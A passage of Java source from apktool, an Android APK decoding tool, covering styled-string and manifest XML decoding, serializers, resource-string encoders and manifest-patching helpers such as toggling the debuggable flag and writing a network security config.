 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.res.xml.ResXmlEncoders;
import com.google.common.base.Splitter;
import com.google.common.base.Splitter.MapSplitter;
import com.google.common.collect.Iterators;
import com.google.common.collect.PeekingIterator;

import java.util.List;
import java.util.Map;
import java.util.logging.Logger;

public class StyledString {
    private final String mText;
    private final List<Span> mSpans;

    public StyledString(String text, List<Span> spans) {
        this.mText = text;
        this.mSpans = spans;
    }

    String getText() {
        return mText;
    }

    List<Span> getSpans() {
        return mSpans;
    }

    @Override
    public String toString() {
        return new Decoder().decode(this);
    }

    public static class Span implements Comparable<Span> {
        private static final MapSplitter ATTRIBUTES_SPLITTER =
            Splitter.on(';').withKeyValueSeparator(Splitter.on('=').limit(2));

        private final String tag;
        private final int firstChar;
        private final int lastChar;

        public Span(String tag, int firstChar, int lastChar) {
            this.tag = tag;
            this.firstChar = firstChar;
            this.lastChar = lastChar;
        }

        public String getTag() {
            return tag;
        }

        public int getFirstChar() {
            return firstChar;
        }

        public int getLastChar() {
            return lastChar;
        }

        public String getName() {
            int separatorIdx = tag.indexOf(';');
            return separatorIdx == -1 ? tag : tag.substring(0, separatorIdx);
        }

        public Map<String, String> getAttributes() {
            int separatorIdx = tag.indexOf(';');
            return separatorIdx == -1 ? null : ATTRIBUTES_SPLITTER.split(
                tag.substring(separatorIdx + 1, tag.endsWith(";") ? tag.length() - 1 : tag.length())
            );
        }

        @Override
        public int compareTo(Span o) {
            int res = Integer.compare(firstChar, o.firstChar);
            if (res != 0) {
                return res;
            }
            res = Integer.compare(lastChar, o.lastChar);
            if (res != 0) {
                return -res;
            }
            return -tag.compareTo(o.tag);
        }
    }

    private static class Decoder {
        private String text;
        private StringBuilder xmlValue;
        private int lastOffset;

        String decode(StyledString styledString) {
            text = styledString.getText();
            xmlValue = new StringBuilder(text.length() * 2);
            lastOffset = 0;

            // recurse top-level tags
            PeekingIterator<Span> it = Iterators.peekingIterator(styledString.getSpans().iterator());
            while (it.hasNext()) {
                decodeIterate(it);
            }

            // write the remaining encoded raw text
            if (lastOffset < text.length()) {
                xmlValue.append(ResXmlEncoders.escapeXmlChars(text.substring(lastOffset)));
            }
            return xmlValue.toString();
        }

        private void decodeIterate(PeekingIterator<Span> it) {
            Span span = it.next();
            String name = span.getName();
            Map<String, String> attributes = span.getAttributes();
            int spanStart = span.getFirstChar();
            int spanEnd = span.getLastChar() + 1;

            // write encoded raw text preceding the opening tag
            if (spanStart > lastOffset) {
                xmlValue.append(ResXmlEncoders.escapeXmlChars(text.substring(lastOffset, spanStart)));
            }
            lastOffset = spanStart;

            // write opening tag
            xmlValue.append('<').append(name);
            if (attributes != null) {
                for (Map.Entry<String, String> attrEntry : attributes.entrySet()) {
                    xmlValue.append(' ').append(attrEntry.getKey()).append("=\"")
                            .append(ResXmlEncoders.escapeXmlChars(attrEntry.getValue())).append('"');
                }
            }
            // if an opening tag is followed by a matching closing tag, write as an empty-element tag
            if (spanStart == spanEnd) {
                xmlValue.append("/>");
                return;
            }
            xmlValue.append('>');

            // recurse nested tags
            while (it.hasNext() && it.peek().getFirstChar() < spanEnd) {
                decodeIterate(it);
            }

            // write encoded raw text preceding the closing tag
            if (spanEnd > lastOffset) {
                xmlValue.append(ResXmlEncoders.escapeXmlChars(text.substring(lastOffset, spanEnd)));
            }
            lastOffset = spanEnd;

            // write closing tag
            xmlValue.append("</").append(name).append('>');
        }
    }

    private static final Logger LOGGER = Logger.getLogger(StyledString.class.getName());
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/XmlPullStreamDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.AndrolibException;
import brut.androlib.err.AXmlDecodingException;
import brut.androlib.err.RawXmlEncounteredException;
import brut.androlib.res.data.ResTable;
import brut.androlib.res.util.ExtXmlSerializer;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;
import org.xmlpull.v1.wrapper.XmlPullParserWrapper;
import org.xmlpull.v1.wrapper.XmlPullWrapperFactory;
import org.xmlpull.v1.wrapper.XmlSerializerWrapper;
import org.xmlpull.v1.wrapper.classic.StaticXmlSerializerWrapper;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class XmlPullStreamDecoder implements ResStreamDecoder {
    public XmlPullStreamDecoder(XmlPullParser parser,
                                ExtXmlSerializer serializer) {
        this.mParser = parser;
        this.mSerial = serializer;
    }

    @Override
    public void decode(InputStream in, OutputStream out)
            throws AndrolibException {
        try {
            XmlPullWrapperFactory factory = XmlPullWrapperFactory.newInstance();
            XmlPullParserWrapper par = factory.newPullParserWrapper(mParser);
            final ResTable resTable = ((AXmlResourceParser) mParser).getAttrDecoder().getCurrentPackage().getResTable();

            XmlSerializerWrapper ser = new StaticXmlSerializerWrapper(mSerial, factory) {
                boolean hideSdkInfo = false;
                boolean hidePackageInfo = false;

                @Override
                public void event(XmlPullParser pp)
                        throws XmlPullParserException, IOException {
                    int type = pp.getEventType();

                    if (type == XmlPullParser.START_TAG) {
                        if ("manifest".equalsIgnoreCase(pp.getName())) {
                            try {
                                hidePackageInfo = parseManifest(pp);
                            } catch (AndrolibException ignored) {}
                        } else if ("uses-sdk".equalsIgnoreCase(pp.getName())) {
                            try {
                                hideSdkInfo = parseAttr(pp);
                                if (hideSdkInfo) {
                                    return;
                                }
                            } catch (AndrolibException ignored) {}
                        }
                    } else if (hideSdkInfo && type == XmlPullParser.END_TAG
                            && "uses-sdk".equalsIgnoreCase(pp.getName())) {
                        return;
                    } else if (hidePackageInfo && type == XmlPullParser.END_TAG
                            && "manifest".equalsIgnoreCase(pp.getName())) {
                        super.event(pp);
                        return;
                    }
                    super.event(pp);
                }

                private boolean parseManifest(XmlPullParser pp)
                        throws AndrolibException {
                    String attr_name;

                    // read <manifest> for package:
                    for (int i = 0; i < pp.getAttributeCount(); i++) {
                        attr_name = pp.getAttributeName(i);

                        if (attr_name.equalsIgnoreCase(("package"))) {
                            resTable.setPackageRenamed(pp.getAttributeValue(i));
                        } else if (attr_name.equalsIgnoreCase("versionCode")) {
                            resTable.setVersionCode(pp.getAttributeValue(i));
                        } else if (attr_name.equalsIgnoreCase("versionName")) {
                            resTable.setVersionName(pp.getAttributeValue(i));
                        }
                    }
                    return true;
                }

                private boolean parseAttr(XmlPullParser pp)
                        throws AndrolibException {
                    for (int i = 0; i < pp.getAttributeCount(); i++) {
                        final String a_ns = "http://schemas.android.com/apk/res/android";
                        String ns = pp.getAttributeNamespace(i);

                        if (a_ns.equalsIgnoreCase(ns)) {
                            String name = pp.getAttributeName(i);
                            String value = pp.getAttributeValue(i);
                            if (name != null && value != null) {
                                if (name.equalsIgnoreCase("minSdkVersion")
                                        || name.equalsIgnoreCase("targetSdkVersion")
                                        || name.equalsIgnoreCase("maxSdkVersion")
                                        || name.equalsIgnoreCase("compileSdkVersion")) {
                                    resTable.addSdkInfo(name, value);
                                } else {
                                    resTable.clearSdkInfo();
                                    return false; // Found unknown flags
                                }
                            }
                        } else {
                            resTable.clearSdkInfo();

                            if (i >= pp.getAttributeCount()) {
                                return false; // Found unknown flags
                            }
                        }
                    }

                    return ! resTable.getAnalysisMode();
                }
            };

            par.setInput(in, null);
            ser.setOutput(out, null);

            while (par.nextToken() != XmlPullParser.END_DOCUMENT) {
                ser.event(par);
            }
            ser.flush();
        } catch (XmlPullParserException ex) {
            throw new AXmlDecodingException("Could not decode XML", ex);
        } catch (IOException ex) {
            throw new RawXmlEncounteredException("Could not decode XML", ex);
        }
    }

    public void decodeManifest(InputStream in, OutputStream out)
            throws AndrolibException {
            decode(in, out);
    }

    private final XmlPullParser mParser;
    private final ExtXmlSerializer mSerial;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/util/ExtFile.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.util;

import java.io.File;


public class ExtFile extends brut.directory.ExtFile {
    public ExtFile(File file) {
        super(file.getPath());
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/util/ExtMXSerializer.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.util;

import org.xmlpull.renamed.MXSerializer;

import java.io.IOException;
import java.io.OutputStream;
import java.io.Writer;

public class ExtMXSerializer extends MXSerializer implements ExtXmlSerializer {
    @Override
    public void startDocument(String encoding, Boolean standalone)
            throws IOException, IllegalArgumentException, IllegalStateException {
        super.startDocument(encoding != null ? encoding : mDefaultEncoding, standalone);
        this.newLine();
    }

    @Override
    protected void writeAttributeValue(String value, Writer out) throws IOException {
        if (mIsDisabledAttrEscape) {
            out.write(value == null ? "" : value);
            return;
        }
        super.writeAttributeValue(value, out);
    }

    @Override
    public void setOutput(OutputStream os, String encoding) throws IOException {
        super.setOutput(os, encoding != null ? encoding : mDefaultEncoding);
    }

    @Override
    public Object getProperty(String name) throws IllegalArgumentException {
        if (PROPERTY_DEFAULT_ENCODING.equals(name)) {
            return mDefaultEncoding;
        }
        return super.getProperty(name);
    }

    @Override
    public void setProperty(String name, Object value) throws IllegalArgumentException, IllegalStateException {
        if (PROPERTY_DEFAULT_ENCODING.equals(name)) {
            mDefaultEncoding = (String) value;
        } else {
            super.setProperty(name, value);
        }
    }

    @Override
    public ExtXmlSerializer newLine() throws IOException {
        super.out.write(lineSeparator);
        return this;
    }

    @Override
    public void setDisabledAttrEscape(boolean disabled) {
        mIsDisabledAttrEscape = disabled;
    }

    private String mDefaultEncoding;
    private boolean mIsDisabledAttrEscape = false;

}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/util/ExtXmlSerializer.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.util;

import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;

public interface ExtXmlSerializer extends XmlSerializer {

    ExtXmlSerializer newLine() throws IOException;

    void setDisabledAttrEscape(boolean disabled);

    String PROPERTY_SERIALIZER_INDENTATION = "http://xmlpull.org/v1/doc/properties.html#serializer-indentation";
    String PROPERTY_SERIALIZER_LINE_SEPARATOR = "http://xmlpull.org/v1/doc/properties.html#serializer-line-separator";
    String PROPERTY_DEFAULT_ENCODING = "DEFAULT_ENCODING";
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/xml/ResValuesXmlSerializable.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.xml;

import brut.androlib.AndrolibException;
import brut.androlib.res.data.ResResource;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;

public interface ResValuesXmlSerializable {
    void serializeToResValuesXml(XmlSerializer serializer,
                                 ResResource res) throws IOException, AndrolibException;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/xml/ResXmlEncodable.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.xml;

import brut.androlib.AndrolibException;

public interface ResXmlEncodable {
    String encodeAsResXmlAttr() throws AndrolibException;

    String encodeAsResXmlValue() throws AndrolibException;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/xml/ResXmlEncoders.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.xml;

import brut.util.Duo;
import org.apache.commons.lang3.StringUtils;

import java.awt.event.KeyEvent;
import java.util.ArrayList;
import java.util.List;

public final class ResXmlEncoders {

    public static String escapeXmlChars(String str) {
        return StringUtils.replace(StringUtils.replace(str, "&", "&amp;"), "<", "&lt;");
    }

    public static String encodeAsResXmlAttr(String str) {
        if (str == null || str.isEmpty()) {
            return str;
        }

        char[] chars = str.toCharArray();
        StringBuilder out = new StringBuilder(str.length() + 10);

        switch (chars[0]) {
            case '#':
            case '@':
            case '?':
                out.append('\\');
        }

        for (char c : chars) {
            switch (c) {
                case '\\':
                    out.append('\\');
                    break;
                case '"':
                    out.append("&quot;");
                    continue;
                case '\n':
                    out.append("\\n");
                    continue;
                default:
                    if (!isPrintableChar(c)) {
                        out.append(String.format("\\u%04x", (int) c));
                        continue;
                    }
            }
            out.append(c);
        }

        return out.toString();
    }

    public static String encodeAsXmlValue(String str) {
        if (str == null || str.isEmpty()) {
            return str;
        }

        char[] chars = str.toCharArray();
        StringBuilder out = new StringBuilder(str.length() + 10);

        switch (chars[0]) {
            case '#':
            case '@':
            case '?':
                out.append('\\');
        }

        boolean isInStyleTag = false;
        int startPos = 0;
        boolean enclose = false;
        boolean wasSpace = true;
        for (char c : chars) {
            if (isInStyleTag) {
                if (c == '>') {
                    isInStyleTag = false;
                    startPos = out.length() + 1;
                    enclose = false;
                }
            } else if (c == ' ') {
                if (wasSpace) {
                    enclose = true;
                }
                wasSpace = true;
            } else {
                wasSpace = false;
                switch (c) {
                    case '\\':
                    case '"':
                        out.append('\\');
                        break;
                    case '\'':
                    case '\n':
                        enclose = true;
                        break;
                    case '<':
                        isInStyleTag = true;
                        if (enclose) {
                            out.insert(startPos, '"').append('"');
                        }
                        break;
                    default:
                        if (!isPrintableChar(c)) {

                            // lets not write trailing \u0000 if we are at end of string
                            if ((out.length() + 1) == str.length() && c == '\u0000') {
                                continue;
                            }
                            out.append(String.format("\\u%04x", (int) c));
                            continue;
                        }
                }
            }
            out.append(c);
        }

        if (enclose || wasSpace) {
            out.insert(startPos, '"').append('"');
        }
        return out.toString();
    }

    public static boolean hasMultipleNonPositionalSubstitutions(String str) {
        Duo<List<Integer>, List<Integer>> tuple = findSubstitutions(str, 4);
        return ! tuple.m1.isEmpty() && tuple.m1.size() + tuple.m2.size() > 1;
    }

    public static String enumerateNonPositionalSubstitutionsIfRequired(String str) {
        Duo<List<Integer>, List<Integer>> tuple = findSubstitutions(str, 4);
        if (tuple.m1.isEmpty() || tuple.m1.size() + tuple.m2.size() < 2) {
            return str;
        }
        List<Integer> subs = tuple.m1;

        StringBuilder out = new StringBuilder();
        int pos = 0;
        int count = 0;
        for (Integer sub : subs) {
            out.append(str, pos, ++sub).append(++count).append('$');
            pos = sub;
        }
        out.append(str.substring(pos));

        return out.toString();
    }

    /**
     * It returns a tuple of:
     *   - a list of offsets of non positional substitutions. non-pos is defined as any "%" which isn't "%%" nor "%\d+\$"
     *   - a list of offsets of positional substitutions
     */
    private static Duo<List<Integer>, List<Integer>> findSubstitutions(String str, int nonPosMax) {
        if (nonPosMax == -1) {
            nonPosMax = Integer.MAX_VALUE;
        }
        int pos;
        int pos2 = 0;
        List<Integer> nonPositional = new ArrayList<>();
        List<Integer> positional = new ArrayList<>();

        if (str == null) {
            return new Duo<>(nonPositional, positional);
        }

        int length = str.length();

        while ((pos = str.indexOf('%', pos2)) != -1) {
            pos2 = pos + 1;
            if (pos2 == length) {
                nonPositional.add(pos);
                break;
            }
            char c = str.charAt(pos2++);
            if (c == '%') {
                continue;
            }
            if (c >= '0' && c <= '9' && pos2 < length) {
                while ((c = str.charAt(pos2++)) >= '0' && c <= '9' && pos2 < length);
                if (c == '$') {
                    positional.add(pos);
                    continue;
                }
            }

            nonPositional.add(pos);
            if (nonPositional.size() >= nonPosMax) {
                break;
            }
        }

        return new Duo<>(nonPositional, positional);
    }

    private static boolean isPrintableChar(char c) {
        Character.UnicodeBlock block = Character.UnicodeBlock.of(c);
        return !Character.isISOControl(c) && c != KeyEvent.CHAR_UNDEFINED
                && block != null && block != Character.UnicodeBlock.SPECIALS;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/xml/ResXmlPatcher.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.xml;

import brut.androlib.AndrolibException;
import org.w3c.dom.*;
import org.xml.sax.SAXException;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerException;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import javax.xml.xpath.*;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.logging.Logger;

public final class ResXmlPatcher {

    /**
     * Removes "debug" tag from file
     *
     * @param file AndroidManifest file
     * @throws AndrolibException Error reading Manifest file
     */
    public static void removeApplicationDebugTag(File file) throws AndrolibException {
        if (file.exists()) {
            try {
                Document doc = loadDocument(file);
                Node application = doc.getElementsByTagName("application").item(0);

                // load attr
                NamedNodeMap attr = application.getAttributes();
                Node debugAttr = attr.getNamedItem("android:debuggable");

                // remove application:debuggable
                if (debugAttr != null) {
                    attr.removeNamedItem("android:debuggable");
                }

                saveDocument(file, doc);

            } catch (SAXException | ParserConfigurationException | IOException | TransformerException ignored) {
            }
        }
    }

    /**
     * Sets "debug" tag in the file to true
     *
     * @param file AndroidManifest file
     */
    public static void setApplicationDebugTagTrue(File file) {
        if (file.exists()) {
            try {
                Document doc = loadDocument(file);
                Node application = doc.getElementsByTagName("application").item(0);

                // load attr
                NamedNodeMap attr = application.getAttributes();
                Node debugAttr = attr.getNamedItem("android:debuggable");

                if (debugAttr == null) {
                    debugAttr = doc.createAttribute("android:debuggable");
                    attr.setNamedItem(debugAttr);
                }

                // set application:debuggable to 'true
                debugAttr.setNodeValue("true");

                saveDocument(file, doc);

            } catch (SAXException | ParserConfigurationException | IOException | TransformerException ignored) {
            }
        }
    }

    /**
     * Sets the value of the network security config in the AndroidManifest file
     *
     * @param file AndroidManifest file
     */
    public static void setNetworkSecurityConfig(File file) {
        if (file.exists()) {
            try {
                Document doc = loadDocument(file);
                Node application = doc.getElementsByTagName("application").item(0);

                // load attr
                NamedNodeMap attr = application.getAttributes();
                Node netSecConfAttr = attr.getNamedItem("android:networkSecurityConfig");

                if (netSecConfAttr == null) {
                    // there is not an already existing network security configuration
                    netSecConfAttr = doc.createAttribute("android:networkSecurityConfig");
                    attr.setNamedItem(netSecConfAttr);
                }

                // whether it already existed or it was created now set it to the proper value
                netSecConfAttr.setNodeValue("@xml/network_security_config");

                saveDocument(file, doc);

            } catch (SAXException | ParserConfigurationException | IOException | TransformerException ignored) {
            }
        }
    }

    /**
     * Creates a modified network security config file that is more permissive
     *
     * @param file network security config file
     * @throws TransformerException XML file could not be edited
     * @throws IOException XML file could not be located
     * @throws SAXException XML file could not be read
     * @throws ParserConfigurationException XML nodes could be written
     */
    public static void modNetworkSecurityConfig(File file)
        throws ParserConfigurationException, TransformerException, IOException, SAXException {

        DocumentBuilderFactory documentFactory = DocumentBuilderFactory.newInstance();
        DocumentBuilder documentBuilder = documentFactory.newDocumentBuilder();
        Document document = documentBuilder.newDocument();

        Element root = document.createElement("network-security-config");
        document.appendChild(root);
        Element baseConfig = document.createElement("base-config");
        root.appendChild(baseConfig);
        Element trustAnchors = document.createElement("trust-anchors");
        baseConfig.appendChild(trustAnchors);

        Element certSystem = document.createElement("certificates");
        Attr attrSystem = document.createAttribute("src");
        attrSystem.setValue("system");
        certSystem.setAttributeNode(attrSystem);
        trustAnchors.appendChild(certSystem);

        Element certUser = document.createElement("certificates");
        Attr attrUser = document.createAttribute("src");
        attrUser.setValue("user");
        certUser.setAttributeNode(attrUser);
        trustAnchors.appendChild(certUser);

        saveDocument(file, document);
    }

    /**
     * Any @string reference in a provider value in AndroidManifest.xml will break on
     * build, thus preventing the application from installing. This is from a bug/error
     * in AOSP where public resources cannot be part of an authorities attribute within
     * a provider tag.
     *
     * This finds any reference and replaces it with the literal value found in the
     * res/values/strings.xml file.
     *
     * @param file File for AndroidManifest.xml
     */
    public static void fixingPublicAttrsInProviderAttributes(File file) {
        boolean saved = false;
        if (file.exists()) {
            try {
                Document doc = loadDocument(file);
                XPath xPath = XPathFactory.newInstance().newXPath();
                XPathExpression expression = xPath.compile("/manifest/application/provider");

                Object result = expression.evaluate(doc, XPathConstants.NODESET);
                NodeList nodes = (NodeList) result;

                for (int i = 0; i < nodes.getLength(); i++) {
                    Node node = nodes.item(i);
                    NamedNodeMap attrs = node.getAttributes();
                    Node provider = attrs.getNamedItem("android:authorities");

                    if (provider != null) {
                        saved = isSaved(file, saved, provider);
                    }
                }

                // android:scheme
                xPath = XPathFactory.newInstance().newXPath();
                expression = xPath.compile("/manifest/application/activity/intent-filter/data");

                result = expression.evaluate(doc, XPathConstants.NODESET);
                nodes = (NodeList) result;

                for (int i = 0; i < nodes.getLength(); i++) {
                    Node node = nodes.item(i);
                    NamedNodeMap attrs = node.getAttributes();
                    Node provider = attrs.getNamedItem("android:scheme");

                    if (provider != null) {
                        saved = isSaved(file, saved, provider);
                    }
                }

                if (saved) {
                    saveDocument(file, doc);
                }

            }  catch (SAXException | ParserConfigurationException | IOException |
                    XPathExpressionException | TransformerException ignored) {
            }
        }
    }

    /**
     * Checks if the replacement was properly made to a node.
     *
     * @param file File we are searching for value
     * @param saved boolean on whether we need to save
     * @param provider Node we are attempting to replace
     * @return boolean
     */
    private static boolean isSaved(File file, boolean saved, Node provider) {
        String reference = provider.getNodeValue();
        String replacement = pullValueFromStrings(file.getParentFile(), reference);

        if (replacement != null) {
            provider.setNodeValue(replacement);
            saved = true;
        }
        return saved;
    }

    /**
     * Finds key in strings.xml file and returns text value
     *
     * @param directory Root directory of apk
     * @param key String reference (ie @string/foo)
     * @return String|null
     */
    public static String pullValueFromStrings(File directory, String key) {
        if (key == null || ! key.contains("@")) {
            return null;
        }

        File file = new File(directory, "/res/values/strings.xml");
        key = key.replace("@string/", "");

        if (file.exists()) {
            try {
                Document doc = loadDocument(file);
                XPath xPath = XPathFactory.newInstance().newXPath();
                XPathExpression expression = xPath.compile("/resources/string[@name=" + '"' + key + "\"]/text()");

                Object result = expression.evaluate(doc, XPathConstants.STRING);

                if (result != null) {
                    return (String) result;
                }

            }  catch (SAXException | ParserConfigurationException | IOException | XPathExpressionException ignored) {
            }
        }

        return null;
    }

    /**
     * Finds key in integers.xml file and returns text value
     *
     * @param directory Root directory of apk
     * @param key Integer reference (ie @integer/foo)
     * @return String|null
     */
    public static String pullValueFromIntegers(File directory, String key) {
        if (key == null || ! key.contains("@")) {
            return null;
        }

        File file = new File(directory, "/res/values/integers.xml");
        key = key.replace("@integer/", "");

        if (file.exists()) {
            try {
                Document doc = loadDocument(file);
                XPath xPath = XPathFactory.newInstance().newXPath();
                XPathExpression expression = xPath.compile("/resources/integer[@name=" + '"' + key + "\"]/text()");

                Object result = expression.evaluate(doc, XPathConstants.STRING);

                if (result != null) {
                    return (String) result;
                }

            }  catch (SAXException | ParserConfigurationException | IOException | XPathExpressionException ignored) {
            }
        }

        return null;
    }

    /**
     * Removes attributes like "versionCode" and "versionName" from file.
     *
     * @param file File representing AndroidManifest.xml
     */
    public static void removeManifestVersions(File file) {
        if (file.exists()) {
            try {
                Document doc = loadDocument(file);
                Node manifest = doc.getFirstChild();
                NamedNodeMap attr = manifest.getAttributes();
                Node vCode = attr.getNamedItem("android:versionCode");
                Node vName = attr.getNamedItem("android:versionName");

                if (vCode != null) {
                    attr.removeNamedItem("android:versionCode");
                }
                if (vName != null) {
                    attr.removeNamedItem("android:versionName");
                }
                saveDocument(file, doc);

            } catch (SAXException | ParserConfigurationException | IOException | TransformerException ignored) {
            }
        }
    }

    /**
     * Replaces package value with passed packageOriginal string
     *
     * @param file File for AndroidManifest.xml
     * @param packageOriginal Package name to replace
     */
    public static void renameManifestPackage(File file, String packageOriginal) {
        try {
            Document doc = loadDocument(file);

            // Get the manifest line
            Node manifest = doc.getFirstChild();

            // update package attribute
            NamedNodeMap attr = manifest.getAttributes();
            Node nodeAttr = attr.getNamedItem("package");
            nodeAttr.setNodeValue(packageOriginal);
            saveDocument(file, doc);

        } catch (SAXException | ParserConfigurationException | IOException | TransformerException ignored) {
        }
    }

    /**
     *
     * @param file File to load into Document
     * @return Document
     * @throws IOException
     * @throws SAXException
     * @throws ParserConfigurationException
     */
    private static Document loadDocument(File file)
            throws IOException, SAXException, ParserConfigurationException {

        DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();
        docFactory.setFeature(FEATURE_DISABLE_DOCTYPE_DECL, true);
        docFactory.setFeature(FEATURE_LOAD_DTD, false);

        try {
            docFactory.setAttribute(ACCESS_EXTERNAL_DTD, " ");
            docFactory.setAttribute(ACCESS_EXTERNAL_SCHEMA, " ");
        } catch (IllegalArgumentException ex) {
            LOGGER.warning("JAXP 1.5 Support is required to validate XML");
        }

        DocumentBuilder docBuilder = docFactory.newDocumentBuilder();
        // Not using the parse(File) method on purpose, so that we can control when
        // to close it. Somehow parse(File) does not seem to close the file in all cases.
        try (FileInputStream inputStream = new FileInputStream(file)) {
            return docBuilder.parse(inputStream);
        }
    }

    /**
     *
     * @param file File to save Document to (ie AndroidManifest.xml)
     * @param doc Document being saved
     * @throws IOException
     * @throws SAXException
     * @throws ParserConfigurationException
     * @throws TransformerException
     */
    private static void saveDocument(File file, Document doc)
            throws IOException, SAXException, ParserConfigurationException, TransformerException {

        TransformerFactory transformerFactory = TransformerFactory.newInstance();
        Transformer transformer = transformerFactory.newTransformer();
        DOMSource source = new DOMSource(doc);
        StreamResult result = new StreamResult(file);
